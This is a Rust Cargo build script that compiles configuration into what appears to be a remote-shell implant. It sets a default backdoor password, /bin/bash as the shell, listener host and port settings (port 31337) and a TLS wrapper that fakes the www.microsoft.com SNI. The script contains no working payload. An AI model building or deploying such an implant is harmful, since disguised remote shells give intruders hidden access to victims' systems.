use std::env;

fn main() {
    let vars = [
        ("NEAP_PASSWORD", "letmeinbrudipls"),
        ("NEAP_PUBKEY", ""),
        ("NEAP_SHELL", "/bin/bash"),
        ("NEAP_LUSER", "svc"),
        ("NEAP_LHOST", ""),
        ("NEAP_LPORT", "31337"),
        ("NEAP_BPORT", "0"),
        ("NEAP_NOCLI", ""),
        ("NEAP_TLS_WRAP", ""),
        ("NEAP_TLS_SNI", "www.microsoft.com"),
    ];

    for (key, default) in &vars {
        let value = env::var(key).unwrap_or_else(|_| default.to_string());
        println!("cargo:rustc-env={}={}", key, value);
        println!("cargo:rerun-if-env-changed={}", key);
    }

    println!(
        "cargo:rustc-env=NEAP_VERSION={}",
        env::var("CARGO_PKG_VERSION").unwrap()
    );
}
